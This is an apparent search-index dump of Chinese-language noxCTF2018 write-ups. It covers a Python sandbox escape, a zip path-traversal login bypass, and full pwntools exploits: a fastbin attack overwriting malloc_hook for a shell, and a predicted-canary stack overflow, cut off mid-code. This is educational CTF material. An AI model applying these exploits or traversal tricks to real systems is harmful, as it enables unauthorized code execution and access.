fun\uff0c\u8fd9\u4e2a\u505a\u4e86\u5f88\u591a\u8fc7\u6ee4\uff0c\u800c\u4e14\u662f\u57fa\u4e8epython3, \u76f8\u5bf9\u6765\u8bf4\u7f51\u4e0a\u53ea\u6709python2\u7684\u8d44\u6599\uff0c\u6240\u4ee5\u5176\u4e2d\u7684\u7ec4\u4ef6\u9700\u8981\u81ea\u5df1\u53bb\b\u5bfb\u627e \u867d\u7136\u8fc7\u6ee4\u4e86\u5f88\u591a\u5173\u952e\u5b57\uff0c\u4f46\u5176\u5b9e\u6d4b\u8bd5\u4e00\u4e0b\u4e0d\u96be\u53d1\u73b0\uff0c\u5f88\u591a\u80fd\u7528\u7684\u4e1c\u897f\u5e76\u6ca1\u6709\u88ab\u8fc7\u6ee4\uff0c\u53ea\u6709python\u4e2d\u7684\u5e38\u89c1\u5173\u952e\u5b57\u88ab\u8fc7\u6ee4\u6389\u4e86\uff0c\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528baseclass\u6765\u6309\u9700\u83b7\u53d6 \u6240\u4ee5\u4e00\u4e2a\u4e00\u4e2a\u627e\uff0c\u540e\u9762\u53d1\u73b0\u4e86\u6709os\uff0c\u4e8e\u662f\u9009\u62e9\u76f4\u63a5\u7528system\u53bb\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u8bfbflag","title":"Python_for_fun_2"},{"location":"noxCTF2018/misc/Python_for_fun_2/writeup/#python-for-fun-2","text":"\u8f83\u4e8epython for fun\uff0c\u8fd9\u4e2a\u505a\u4e86\u5f88\u591a\u8fc7\u6ee4\uff0c\u800c\u4e14\u662f\u57fa\u4e8epython3, \u76f8\u5bf9\u6765\u8bf4\u7f51\u4e0a\u53ea\u6709python2\u7684\u8d44\u6599\uff0c\u6240\u4ee5\u5176\u4e2d\u7684\u7ec4\u4ef6\u9700\u8981\u81ea\u5df1\u53bb\b\u5bfb\u627e \u867d\u7136\u8fc7\u6ee4\u4e86\u5f88\u591a\u5173\u952e\u5b57\uff0c\u4f46\u5176\u5b9e\u6d4b\u8bd5\u4e00\u4e0b\u4e0d\u96be\u53d1\u73b0\uff0c\u5f88\u591a\u80fd\u7528\u7684\u4e1c\u897f\u5e76\u6ca1\u6709\u88ab\u8fc7\u6ee4\uff0c\u53ea\u6709python\u4e2d\u7684\u5e38\u89c1\u5173\u952e\u5b57\u88ab\u8fc7\u6ee4\u6389\u4e86\uff0c\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528baseclass\u6765\u6309\u9700\u83b7\u53d6 \u6240\u4ee5\u4e00\u4e2a\u4e00\u4e2a\u627e\uff0c\u540e\u9762\u53d1\u73b0\u4e86\u6709os\uff0c\u4e8e\u662f\u9009\u62e9\u76f4\u63a5\u7528system\u53bb\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u8bfbflag","title":"Python for fun 2"},{"location":"noxCTF2018/misc/Read_Between_The_Lines/writeup/","text":"Read Between The Lines \u00b6 file\u53d1\u73b0\u662fgzip compressed data\uff0c\u89e3\u4e86\u4e4b\u540e\u6253\u5f00\u9996\u5148\u770b\u5230\u4e00\u6bb5jsfuck \u89e3\u5f00\u540e\u53d1\u73b0\u53ea\u662f\u4e00\u4e2a\u5f39\u7a97\u7684\u4ee3\u7801 \u8fd9\u65f6\u53d1\u73b0jsfuck\u4e0b\u8fd8\u6709\u4e00\u5927\u5806\u7684\u7a7a\u767d\uff0c\u611f\u89c9\u5f88\u5947\u602a\uff0c\u4e8e\u662f\u5168\u9009\u4e86\u4e0b \u8fd9\u770b\u8d77\u6765\u5f88\u50cfwhitespace\uff0c\u627e\u4e86\u4e2a\u89e3\u91ca\u5668\u8dd1\u4e00\u4e0b\u5c31\u51faflag\u4e86","title":"Read_Between_The_Lines"},{"location":"noxCTF2018/misc/Read_Between_The_Lines/writeup/#read-between-the-lines","text":"file\u53d1\u73b0\u662fgzip compressed data\uff0c\u89e3\u4e86\u4e4b\u540e\u6253\u5f00\u9996\u5148\u770b\u5230\u4e00\u6bb5jsfuck \u89e3\u5f00\u540e\u53d1\u73b0\u53ea\u662f\u4e00\u4e2a\u5f39\u7a97\u7684\u4ee3\u7801 \u8fd9\u65f6\u53d1\u73b0jsfuck\u4e0b\u8fd8\u6709\u4e00\u5927\u5806\u7684\u7a7a\u767d\uff0c\u611f\u89c9\u5f88\u5947\u602a\uff0c\u4e8e\u662f\u5168\u9009\u4e86\u4e0b \u8fd9\u770b\u8d77\u6765\u5f88\u50cfwhitespace\uff0c\u627e\u4e86\u4e2a\u89e3\u91ca\u5668\u8dd1\u4e00\u4e0b\u5c31\u51faflag\u4e86","title":"Read Between The Lines"},{"location":"noxCTF2018/misc/Slippery_Situation/writeup/","text":"Slippery Situation \u00b6 \u9875\u9762\u4e0a\u6709\u5f88\u957f\u4e00\u6bb5\u8bdd ou upload a zip file, our servers extract the file using bash command \"unzip -: file.zip\" the server scans the files inside and returns results! We dont believe in containers, all zip files are uploaded to /files/ directory and get extracted there for maximum security! \u53ef\u4ee5\u5f97\u5230\u4e24\u4e2a\u6709\u7528\u7684\u4fe1\u606f\uff0c\u7b2c\u4e00\u4e2a\u662f\u4f1a\u7528unzip -: file.zip\u8fdb\u884c\u89e3\u538b\uff0c\u5176\u6b21\u662f\u5c06\u6587\u4ef6\u90fd\u653e\u5728\u4e86/files/\u4e0b \u53ef\u4ee5\u770b\u5230\u7528\u4e86 unzip -: \uff0c\u6ca1\u89c1\u8fc7\u8fd9\u4e2aoption\uff0c\u4e8e\u662f\u770b\u4e86\u4e0bunzip\u7684\u5e2e\u52a9\u4fe1\u606f \u7136\u540e\u5c31\u6ca1\u6709\u7136\u540e\u4e86\u3002\u3002 \u968f\u4fbf\u4e0a\u4f20\u4e00\u4e2azip\u4e5f\u53ea\u662f\u8fd4\u56de\u4e00\u6761\u4fe1\u606f\uff0c\u4e8e\u662f\u770b\u4e86\u770b\u7f51\u9875\u6e90\u7801\uff0c\u5f97\u5230\u4e00\u4e2a\u4fe1\u606f <!-- Note to self : admin page link : /admin--> \u8bbf\u95eeadmin\u540e\u662f\u4e00\u4e2a\u767b\u5f55\uff0c\u4f46\u662f\u529f\u80fd\u88ab\u7981\u7528\u6389\u4e86\uff0c\u5728admin\u7684\u9875\u9762\u8fd8\u80fd\u770b\u5230\u53e6\u5916\u4e00\u4e2a\u4fe1\u606f <!-- Note to self so i wont forget : if a file named key.txt containing the short ssid is found in the ./admin directory then you dont need to login with user and pass to save time --> \u53ef\u4ee5\u53d1\u73b0cookie\u4e2d\u5e26\u4e86\u4e00\u4e2ashortssid\uff0c\u5176\u5b9e\u8fd9\u65f6\u5df2\u7ecf\u5f88\u660e\u4e86\u4e86\uff0c\u524d\u9762unzip\u7684-:\u5c31\u662f\u4e3a\u4e86\u8fd9\u4e2a\u5730\u65b9\u5f00\u7684\u4fbf\u5229\u3002 \u5c06\u81ea\u5df1\u7684shortssid\u653e\u5230key.txt\u4e2d\uff0c\u7136\u540e\u538b\u4e00\u4e2a\u5305 zip -r 1 .zip ../admin/key.txt \u4e0a\u4f20\u540e\u8bbf\u95eeadmin\u4f1a\u53d1\u73b0\u6709\u4e00\u4e32base64 VGhpcyBwYWdlIGlzIG9ubHkgYXZhaWxhYmxlIGZvciBBZG1pblBhbmVsIGJyb3dzZXIgdXNlcnMuDQoNCkFkbWluUGFuZWwvMC4xIGFnZW50IHVzZXJzIG9ubHkh \u89e3\u5f00\u540e\u5f97\u5230 This page is only available for AdminPanel browser users. AdminPanel/0.1 agent users only! \u4fee\u6539\u4e0bUA\u518d\u8bbf\u95ee\u5c31\u53ef\u4ee5\u5f97\u5230flag\u4e86","title":"Slippery_Situation"},{"location":"noxCTF2018/misc/Slippery_Situation/writeup/#slippery-situation","text":"\u9875\u9762\u4e0a\u6709\u5f88\u957f\u4e00\u6bb5\u8bdd ou upload a zip file, our servers extract the file using bash command \"unzip -: file.zip\" the server scans the files inside and returns results! We dont believe in containers, all zip files are uploaded to /files/ directory and get extracted there for maximum security! \u53ef\u4ee5\u5f97\u5230\u4e24\u4e2a\u6709\u7528\u7684\u4fe1\u606f\uff0c\u7b2c\u4e00\u4e2a\u662f\u4f1a\u7528unzip -: file.zip\u8fdb\u884c\u89e3\u538b\uff0c\u5176\u6b21\u662f\u5c06\u6587\u4ef6\u90fd\u653e\u5728\u4e86/files/\u4e0b \u53ef\u4ee5\u770b\u5230\u7528\u4e86 unzip -: \uff0c\u6ca1\u89c1\u8fc7\u8fd9\u4e2aoption\uff0c\u4e8e\u662f\u770b\u4e86\u4e0bunzip\u7684\u5e2e\u52a9\u4fe1\u606f \u7136\u540e\u5c31\u6ca1\u6709\u7136\u540e\u4e86\u3002\u3002 \u968f\u4fbf\u4e0a\u4f20\u4e00\u4e2azip\u4e5f\u53ea\u662f\u8fd4\u56de\u4e00\u6761\u4fe1\u606f\uff0c\u4e8e\u662f\u770b\u4e86\u770b\u7f51\u9875\u6e90\u7801\uff0c\u5f97\u5230\u4e00\u4e2a\u4fe1\u606f <!-- Note to self : admin page link : /admin--> \u8bbf\u95eeadmin\u540e\u662f\u4e00\u4e2a\u767b\u5f55\uff0c\u4f46\u662f\u529f\u80fd\u88ab\u7981\u7528\u6389\u4e86\uff0c\u5728admin\u7684\u9875\u9762\u8fd8\u80fd\u770b\u5230\u53e6\u5916\u4e00\u4e2a\u4fe1\u606f <!-- Note to self so i wont forget : if a file named key.txt containing the short ssid is found in the ./admin directory then you dont need to login with user and pass to save time --> \u53ef\u4ee5\u53d1\u73b0cookie\u4e2d\u5e26\u4e86\u4e00\u4e2ashortssid\uff0c\u5176\u5b9e\u8fd9\u65f6\u5df2\u7ecf\u5f88\u660e\u4e86\u4e86\uff0c\u524d\u9762unzip\u7684-:\u5c31\u662f\u4e3a\u4e86\u8fd9\u4e2a\u5730\u65b9\u5f00\u7684\u4fbf\u5229\u3002 \u5c06\u81ea\u5df1\u7684shortssid\u653e\u5230key.txt\u4e2d\uff0c\u7136\u540e\u538b\u4e00\u4e2a\u5305 zip -r 1 .zip ../admin/key.txt \u4e0a\u4f20\u540e\u8bbf\u95eeadmin\u4f1a\u53d1\u73b0\u6709\u4e00\u4e32base64 VGhpcyBwYWdlIGlzIG9ubHkgYXZhaWxhYmxlIGZvciBBZG1pblBhbmVsIGJyb3dzZXIgdXNlcnMuDQoNCkFkbWluUGFuZWwvMC4xIGFnZW50IHVzZXJzIG9ubHkh \u89e3\u5f00\u540e\u5f97\u5230 This page is only available for AdminPanel browser users. AdminPanel/0.1 agent users only! \u4fee\u6539\u4e0bUA\u518d\u8bbf\u95ee\u5c31\u53ef\u4ee5\u5f97\u5230flag\u4e86","title":"Slippery Situation"},{"location":"noxCTF2018/pwn/GroceryList/writeup/","text":"\u6f0f\u6d1e\u5206\u6790 \u00b6 \u901a\u8fc7\u9006\u5411\u67e5\u770b\u4ee3\u7801\uff0c\u53d1\u73b0\u53ea\u5141\u8bb80x10\u30010x38\u30010x60\u5927\u5c0f\u7684\u5806\uff0c\u63a8\u65adfastbin attack\u3002 \u5229\u7528\u4ee3\u7801 \u00b6 #!/usr/bin/env python2 # coding: utf-8 # Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR from pwn import * import itertools # IP = \"chal.noxale.com\" # PORT = 1232 IP = \"127.0.0.1\" PORT = 9999 # context.log_level = 'critical' context . log_level = 'DEBUG' context . terminal = [ 'tmux' , 'splitw' , '-h' ] # context(os='linux',arch='amd64') mode = args [ 'MODE' ] . lower () binary = \"./GroceryList\" def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) def print_list (): sel ( \"1\" ) rud ( \"----------\" ) data = rud ( \"----------\" ) return data def add ( ssize , content ): # 1 --> 0x10 # 2 --> 0x38 # 3 --> 0x60 # rud(\"Exit\") sel ( str ( 2 )) rud ( \"Large\" ) sel ( str ( ssize )) rud ( \"name: \" ) sel ( content ) def empty ( ssize ): # 1 --> 0x10 # 2 --> 0x38 # 3 --> 0x60 # rud(\"Exit\") sel ( str ( 3 )) rud ( \"Large\" ) sel ( str ( ssize )) rud ( \"add?\" ) sel ( str ( 1 )) def example (): sel ( str ( 6 )) rud ( \"added\" ) def edit ( id , content ): sel ( str ( 5 )) rud ( \"edit?\" ) sel ( str ( id )) rud ( \"name: \" ) sel ( content ) def remove ( id ): sel ( str ( 4 )) rud ( \"remove?\" ) sel ( str ( id )) if mode == \"remote\" : context . noptrace = True io = remote ( IP , PORT ) else : io = process ( binary ) proc_base = io . libs ()[ \"/home/vagrant/DongFeng/noxCTF2018/pwn/GroceryList/GroceryList\" ] libc_bb = io . libs ()[ '/lib/x86_64-linux-gnu/libc-2.23.so' ] io . recvline () one_gg = 0xf02a4 # gdb.attach(io, ''' # b *0x{:x} # b *0x{:x} # c # '''.format(proc_base+0x0000000000001113, libc_bb + one_gg) # # print_list\u548conegadget\u4e0b\u65ad\u70b9 # ) ##\u5efa2\u4e2a0x20\u5806\uff0c2\u4e2a0x70\u5806\uff0c\u548c\u4e00\u4e2aexample\u5806\uff08\u5176\u4e2d\u5806\u4e0a\u6709\u6808\u5730\u5740\uff09 add ( 1 , \"A\" * 0x10 ) add ( 1 , \"B\" * 0x10 ) add ( 3 , \"C\" * 0x60 ) add ( 3 , \"D\" * 0x60 ) example () ## \u628a\u6240\u6709\u5806\u5185\u5bb9\u6253\u5370\u51fa\u6765\uff0c\u6cc4\u9732\u4e86\u5806\u4e0a\u7684\u6808\u5730\u5740 data = print_list () stack_address = data . split ( \"4. \" )[ 1 ][: 8 ] . strip () stack_address = u64 ( stack_address . ljust ( 8 , \" \\x00 \" )) print \"[+] STAC\" , hex ( stack_address ) # \u5220\u9664\u7b2c2\u4e2a0x20\u5927\u5c0f\u7684\u5806\uff0c\u751f\u62100x20\u5927\u5c0f\u7684fastbin\u3000free\u5806\u5757\u94fe remove ( 1 ) # \u901a\u8fc7\u7b2c1\u4e2a0x20\u5927\u5c0f\u7684\u5806\uff0c\u6ea2\u51fa\u8986\u76d6\u7b2c2\u4e2a0x20\u5806\u7684fd\u5730\u5740\uff0c\u4e3a\u6808\u4e0a\u5730\u5740\uff0c\u7528\u4e8e\u6cc4\u9732libc_start_main\u5730\u5740 edit ( 0 , \"d\" * 16 + p64 ( 0 ) + p64 ( 0x21 ) + p64 ( stack_address - 0xb - 0x10 )) # \u7533\u8bf70x20\u5927\u5c0f\u5806\u5757\uff0c\u5b8c\u6210\u540e\uff0c\u4e0b\u4e00\u4e2a\u7a7a\u95f2\u5806\u5757\u5373\u4e3a\u6808\u4e0a\u5730\u5740 empty ( 1 ) # \u518d\u6b21\u7533\u8bf7\uff0c\u5219\u65b0\u5806\u5757\u5373\u5728\u6808\u4e0a empty ( 1 ) # \u6b64\u65f6\u6cc4\u9732libc\u5730\u5740 data = print_list () print \"[+] \" , data libc_address = data . split ( \"5. \" )[ 1 ][: 8 ] . strip ( \" \\n \" ) libc_address = u64 ( libc_address . ljust ( 8 , \" \\x00 \" )) libc_base = libc_address - 0x20740 - 240 print \"[+] LIBC\" , hex ( libc_base ) # \u7f16\u8f91\u6808\u4e0a\u5806\u5757\uff0c\u5199\u4e00\u58060\uff0c\u4e3a\u540e\u7eedone_gadget\u7684\u6761\u4ef6\u505a\u51c6\u5907\uff0c\u9650\u5b9a\u6761\u4ef6\u4e3arsp+0x50=null\u3002 edit ( 5 , p64 ( libc_address ) + p64 ( 0 ) * 3 ) ##\u3000\u52200x60\u5927\u5c0f\u7684\u5806\uff0c\u751f\u62100x60\u5927\u5c0f\u7684fastbin\u3000free\u5806\u5757\u94fe remove ( 2 ) print_list () one_gadget_address = libc_base + one_gg new_malloc_hook = libc_base + 0x00000000003c4b10 - 0x20 + 0x5 - 0x8 # \u7f16\u8bd1\u7b2c1\u4e2a0x70\u5927\u5c0f\u7684\u5806\uff0c\u6ea2\u51fa\u8986\u76d6\u5230\u540e\u9762\u7684\u7b2c2\u4e2a0x70\u5806\uff0c\u4f7f\u5176fd\u4e3amalloc_hook-0x23 edit ( 1 , \"d\" * 0x60 + p64 ( 0 ) + p64 ( 0x71 ) + p64 ( new_malloc_hook )) print_list () # \u7533\u8bf70x70\u5927\u5c0f\u5806\uff0c\u5b8c\u6210\u540e\uff0c\u4e0b\u4e00\u4e2a\u7a7a\u95f2\u5806\u5757\u5373\u4e3amalloc_hook-0x23+0x10 empty ( 3 ) # \u518d\u6b21\u7533\u8bf7\uff0c\u5219\u65b0\u5806\u5757\u5728malloc_hook\u9644\u8fd1 empty ( 3 ) print_list () # \u4f7f\u7528\u65b0\u5806\u5757\u8986\u76d6malloc_hook\u7684\u5730\u5740\uff0c\u8986\u76d6\u5185\u5bb9\u4e3aone_gadget\u5730\u5740 edit ( 6 , \"A\" * 19 + p64 ( one_gadget_address )) print_list () # \u89e6\u53d1\u6f0f\u6d1e empty ( 1 ) io . interactive ()","title":"Grocery List"},{"location":"noxCTF2018/pwn/GroceryList/writeup/#_1","text":"\u901a\u8fc7\u9006\u5411\u67e5\u770b\u4ee3\u7801\uff0c\u53d1\u73b0\u53ea\u5141\u8bb80x10\u30010x38\u30010x60\u5927\u5c0f\u7684\u5806\uff0c\u63a8\u65adfastbin attack\u3002","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"noxCTF2018/pwn/GroceryList/writeup/#_2","text":"#!/usr/bin/env python2 # coding: utf-8 # Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR from pwn import * import itertools # IP = \"chal.noxale.com\" # PORT = 1232 IP = \"127.0.0.1\" PORT = 9999 # context.log_level = 'critical' context . log_level = 'DEBUG' context . terminal = [ 'tmux' , 'splitw' , '-h' ] # context(os='linux',arch='amd64') mode = args [ 'MODE' ] . lower () binary = \"./GroceryList\" def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) def print_list (): sel ( \"1\" ) rud ( \"----------\" ) data = rud ( \"----------\" ) return data def add ( ssize , content ): # 1 --> 0x10 # 2 --> 0x38 # 3 --> 0x60 # rud(\"Exit\") sel ( str ( 2 )) rud ( \"Large\" ) sel ( str ( ssize )) rud ( \"name: \" ) sel ( content ) def empty ( ssize ): # 1 --> 0x10 # 2 --> 0x38 # 3 --> 0x60 # rud(\"Exit\") sel ( str ( 3 )) rud ( \"Large\" ) sel ( str ( ssize )) rud ( \"add?\" ) sel ( str ( 1 )) def example (): sel ( str ( 6 )) rud ( \"added\" ) def edit ( id , content ): sel ( str ( 5 )) rud ( \"edit?\" ) sel ( str ( id )) rud ( \"name: \" ) sel ( content ) def remove ( id ): sel ( str ( 4 )) rud ( \"remove?\" ) sel ( str ( id )) if mode == \"remote\" : context . noptrace = True io = remote ( IP , PORT ) else : io = process ( binary ) proc_base = io . libs ()[ \"/home/vagrant/DongFeng/noxCTF2018/pwn/GroceryList/GroceryList\" ] libc_bb = io . libs ()[ '/lib/x86_64-linux-gnu/libc-2.23.so' ] io . recvline () one_gg = 0xf02a4 # gdb.attach(io, ''' # b *0x{:x} # b *0x{:x} # c # '''.format(proc_base+0x0000000000001113, libc_bb + one_gg) # # print_list\u548conegadget\u4e0b\u65ad\u70b9 # ) ##\u5efa2\u4e2a0x20\u5806\uff0c2\u4e2a0x70\u5806\uff0c\u548c\u4e00\u4e2aexample\u5806\uff08\u5176\u4e2d\u5806\u4e0a\u6709\u6808\u5730\u5740\uff09 add ( 1 , \"A\" * 0x10 ) add ( 1 , \"B\" * 0x10 ) add ( 3 , \"C\" * 0x60 ) add ( 3 , \"D\" * 0x60 ) example () ## \u628a\u6240\u6709\u5806\u5185\u5bb9\u6253\u5370\u51fa\u6765\uff0c\u6cc4\u9732\u4e86\u5806\u4e0a\u7684\u6808\u5730\u5740 data = print_list () stack_address = data . split ( \"4. \" )[ 1 ][: 8 ] . strip () stack_address = u64 ( stack_address . ljust ( 8 , \" \\x00 \" )) print \"[+] STAC\" , hex ( stack_address ) # \u5220\u9664\u7b2c2\u4e2a0x20\u5927\u5c0f\u7684\u5806\uff0c\u751f\u62100x20\u5927\u5c0f\u7684fastbin\u3000free\u5806\u5757\u94fe remove ( 1 ) # \u901a\u8fc7\u7b2c1\u4e2a0x20\u5927\u5c0f\u7684\u5806\uff0c\u6ea2\u51fa\u8986\u76d6\u7b2c2\u4e2a0x20\u5806\u7684fd\u5730\u5740\uff0c\u4e3a\u6808\u4e0a\u5730\u5740\uff0c\u7528\u4e8e\u6cc4\u9732libc_start_main\u5730\u5740 edit ( 0 , \"d\" * 16 + p64 ( 0 ) + p64 ( 0x21 ) + p64 ( stack_address - 0xb - 0x10 )) # \u7533\u8bf70x20\u5927\u5c0f\u5806\u5757\uff0c\u5b8c\u6210\u540e\uff0c\u4e0b\u4e00\u4e2a\u7a7a\u95f2\u5806\u5757\u5373\u4e3a\u6808\u4e0a\u5730\u5740 empty ( 1 ) # \u518d\u6b21\u7533\u8bf7\uff0c\u5219\u65b0\u5806\u5757\u5373\u5728\u6808\u4e0a empty ( 1 ) # \u6b64\u65f6\u6cc4\u9732libc\u5730\u5740 data = print_list () print \"[+] \" , data libc_address = data . split ( \"5. \" )[ 1 ][: 8 ] . strip ( \" \\n \" ) libc_address = u64 ( libc_address . ljust ( 8 , \" \\x00 \" )) libc_base = libc_address - 0x20740 - 240 print \"[+] LIBC\" , hex ( libc_base ) # \u7f16\u8f91\u6808\u4e0a\u5806\u5757\uff0c\u5199\u4e00\u58060\uff0c\u4e3a\u540e\u7eedone_gadget\u7684\u6761\u4ef6\u505a\u51c6\u5907\uff0c\u9650\u5b9a\u6761\u4ef6\u4e3arsp+0x50=null\u3002 edit ( 5 , p64 ( libc_address ) + p64 ( 0 ) * 3 ) ##\u3000\u52200x60\u5927\u5c0f\u7684\u5806\uff0c\u751f\u62100x60\u5927\u5c0f\u7684fastbin\u3000free\u5806\u5757\u94fe remove ( 2 ) print_list () one_gadget_address = libc_base + one_gg new_malloc_hook = libc_base + 0x00000000003c4b10 - 0x20 + 0x5 - 0x8 # \u7f16\u8bd1\u7b2c1\u4e2a0x70\u5927\u5c0f\u7684\u5806\uff0c\u6ea2\u51fa\u8986\u76d6\u5230\u540e\u9762\u7684\u7b2c2\u4e2a0x70\u5806\uff0c\u4f7f\u5176fd\u4e3amalloc_hook-0x23 edit ( 1 , \"d\" * 0x60 + p64 ( 0 ) + p64 ( 0x71 ) + p64 ( new_malloc_hook )) print_list () # \u7533\u8bf70x70\u5927\u5c0f\u5806\uff0c\u5b8c\u6210\u540e\uff0c\u4e0b\u4e00\u4e2a\u7a7a\u95f2\u5806\u5757\u5373\u4e3amalloc_hook-0x23+0x10 empty ( 3 ) # \u518d\u6b21\u7533\u8bf7\uff0c\u5219\u65b0\u5806\u5757\u5728malloc_hook\u9644\u8fd1 empty ( 3 ) print_list () # \u4f7f\u7528\u65b0\u5806\u5757\u8986\u76d6malloc_hook\u7684\u5730\u5740\uff0c\u8986\u76d6\u5185\u5bb9\u4e3aone_gadget\u5730\u5740 edit ( 6 , \"A\" * 19 + p64 ( one_gadget_address )) print_list () # \u89e6\u53d1\u6f0f\u6d1e empty ( 1 ) io . interactive ()","title":"\u5229\u7528\u4ee3\u7801"},{"location":"noxCTF2018/pwn/GroceryList/docker_env/","text":"ctf_xinetd \u00b6 A docker repository for deploying ctf problem configuration \u00b6 Put files to floder bin . They'll be copied to /home/ctf. Update the flag at the same time. Edit ctf.xinetd . replace ./helloworld to your command. You can also edit Dockerfile, ctf.xinetd, start.sh to custom your environment. build \u00b6 docker build -t \"helloworld\" . run \u00b6 docker run -d -p \"0.0.0.0:pubport:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld","title":"ctf_xinetd"},{"location":"noxCTF2018/pwn/GroceryList/docker_env/#ctf_xinetd","text":"A docker repository for deploying ctf problem","title":"ctf_xinetd"},{"location":"noxCTF2018/pwn/GroceryList/docker_env/#configuration","text":"Put files to floder bin . They'll be copied to /home/ctf. Update the flag at the same time. Edit ctf.xinetd . replace ./helloworld to your command. You can also edit Dockerfile, ctf.xinetd, start.sh to custom your environment.","title":"configuration"},{"location":"noxCTF2018/pwn/GroceryList/docker_env/#build","text":"docker build -t \"helloworld\" .","title":"build"},{"location":"noxCTF2018/pwn/GroceryList/docker_env/#run","text":"docker run -d -p \"0.0.0.0:pubport:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld","title":"run"},{"location":"noxCTF2018/pwn/TheBlackCanary/writeup/","text":"\u6f0f\u6d1e\u5206\u6790 \u00b6 \u53ef\u8f93\u5165\u8d1f\u6570\uff0c\u8fbe\u5230\u6570\u7ec4\u8d8a\u754c\u7684\u76ee\u7684\uff0c\u4ece\u800c\u53ef\u4ee5\u5411\u540e\u6ea2\u51fa\u8986\u76d6\u8fd4\u56de\u5730\u5740\u3002\u4f46\u56e0\u6ea2\u51fa\u9650\u5236\uff0c\u5fc5\u987b\u5148\u8986\u76d6canary\uff0c\u800ccanary\u65e0\u6cd5\u6cc4\u9732\u3002 \u5229\u7528\u4ee3\u7801 \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * from time import sleep import os import sys elfPath = \"./TheBlackCanary\" libcPath = \"./libc.so.6\" remoteAddr = \"chal.noxale.com\" remotePort = 6667 context . binary = elfPath elf = context . binary if sys . argv [ 1 ] == \"l\" : io = process ( elfPath ) libc = elf . libc else : if sys . argv [ 1 ] == \"d\" : io = process ( elfPath , env = { \"LD_PRELOAD\" : libcPath }) else : io = remote ( remoteAddr , remotePort ) if libcPath : libc = ELF ( libcPath ) # context.log_level = \"debug\" context . terminal = [ \"deepin-terminal\" , \"-x\" , \"sh\" , \"-c\" ] success = lambda name , value : log . success ( \"{} -> {:#x}\" . format ( name , value )) def DEBUG (): info ( \"PID -> {}\" . format ( io . pid )) raw_input ( \"DEBUG: \" ) def show (): io . sendlineafter ( \"die \\n \" , \"1\" ) def add ( argument ): assert len ( argument ) < 32 io . sendlineafter ( \"die \\n \" , \"2\" ) io . sendafter ( \": \\n \" , argument ) def edit ( idx , argument ): assert len ( argument ) < 32 io . sendlineafter ( \"die \\n \" , \"3\" ) io . sendlineafter ( \"? \\n \" , str ( idx )) io . sendlineafter ( \": \\n \" , argument ) def remove_single ( idx ): io . sendlineafter ( \"die \\n \" , \"4\" ) io . sendlineafter ( \"arguments \\n \" , \"1\" ) io . sendlineafter ( \"remove? \\n \" , str ( idx )) def remove_consecutive ( idx_start , num ): io . sendlineafter ( \"die \\n \" , \"4\" ) io . sendlineafter ( \"arguments \\n \" , \"2\" ) io . sendlineafter ( \"start? \\n \" , str ( idx_start )) io . sendlineafter ( \"remove? \\n \" , str ( num )) def leave (): io . sendlineafter ( \"die \\n \" , \"5\" ) get_canary = lambda : int ( os . popen ( \"./set_canary\" ) . read () . strip (), 16 ) if __name__ == \"__main__\" : ''' This challenge named \"The Black Canary\" suggests there must be something interesting with canary. And when I take a look at .init_array, an interesting function appears(I call it set_canary, located at 0x4008C7). unsigned __int64 set_canary() { int v0; // ebx unsigned __int64 v1; // rbx int v2; // er12 unsigned __int64 v3; // ST08_8 time_t v4; // rbx unsigned __int64 v5; // ST08_8 time_t v6; // ST08_8 time_t v7; // ST08_8 unsigned __int64 result; // rax time(0LL); time(0LL); v0 = time(0LL) >> 24; v1 = (unsigned __int64)(unsigned __int8)(v0 ^ (unsigned __int64)getenv(name)) << 24; v2 = time(0LL) >> 16; v3 = v1 + ((unsigned __int64)(unsigned __int8)(v2 ^ (unsigned __int64)getenv(name)) << 16); v4 = time(0LL) >> 8; v5 = (unsigned __int16)((((unsigned __int16)v4 ^ (unsigned __int16)time(0LL)) << 8) & 0xFF00) + v3; v6 = ((time(0LL) << 32) & 0xFF00000000LL) + v5; v7 = time(0LL) + v6; LODWORD(v4) = time(0LL) >> 24; LODWORD(v4) = (time(0LL) >> 16) + v4; LODWORD(v4) = (time(0LL) >> 8) + v4; result = ((unsigned __int64)(unsigned __int8)(v4 + time(0LL)) << 40) + v7; __writefsqword(0x28u, result); return result; } And we know that time(0) is predictable, as a result, we're able to predict canary. So if there is a stack_overflow_bug, this challenge will be easy to be pwned. ''' canary = get_canary () success ( \"canary\" , canary ) ''' The bof bug will appear it we use remove_consecutive() with a negative amount of arguments. void __fastcall remove_consecutive(char *arg_list, _DWORD *cnt) { size_t len; // rax char idx; // [rsp+15h] [rbp-Bh] char remove_num; // [rsp+16h] [rbp-Ah] char i; // [rsp+17h] [rbp-9h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); idx = 0; remove_num = 0; i = 0; print(\"With which argument would you like to start?\"); fflush(stdin); __isoc99_scanf(\"%hhd\", &idx); getchar(); if ( idx < 0 || (char)*cnt <= idx ) { print(\"Index not in range\"); } else { print(\"How many arguments would you like to remove?\"); fflush(stdin); __isoc99_scanf(\"%hhd\", &remove_num); // negative getchar(); if ( remove_num + idx < (char)*cnt ) { for ( i = 0; i < remove_num; ++i ) { if ( remove_num + i + idx >= (char)*cnt ) { arg_list[32 * (idx + i)] = 0; } else { len = strlen(&arg_list[32 * (i + idx + remove_num)]); strncpy(&arg_list[32 * (idx + i)], &arg_list[32 * (i + idx + remove_num)], len + 1); arg_list[32 * 